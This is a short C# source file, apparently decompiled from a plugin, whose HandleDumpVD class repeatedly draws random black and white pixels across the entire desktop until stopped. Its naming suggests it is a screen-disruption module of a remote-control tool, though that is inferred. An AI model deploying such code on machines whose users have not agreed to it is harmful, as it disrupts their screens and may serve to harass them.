using System;
using System.Threading;
using System.Windows.Forms;
using Plugin.Helper.GDI;

namespace Plugin.Handler.GDI;

internal class HandleDumpVD
{
	public static CancellationTokenSource ctsStop;

	public static void Start()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			return;
		}
		ctsStop = new CancellationTokenSource();
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		Random random = new Random();
		while (!ctsStop.IsCancellationRequested)
		{
			IntPtr dC = NativeMethods.GetDC(IntPtr.Zero);
			for (int i = 0; i < 10; i++)
			{
				NativeMethods.SetPixel(dC, random.Next(width), random.Next(height), NativeMethods.RGB(0, 0, 0));
				NativeMethods.SetPixel(dC, random.Next(width), random.Next(height), NativeMethods.RGB(255, 255, 255));
			}
			NativeMethods.ReleaseDC(IntPtr.Zero, dC);
			Thread.Sleep(10);
		}
	}

	public static void Stop()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			ctsStop.Cancel();
		}
	}
}
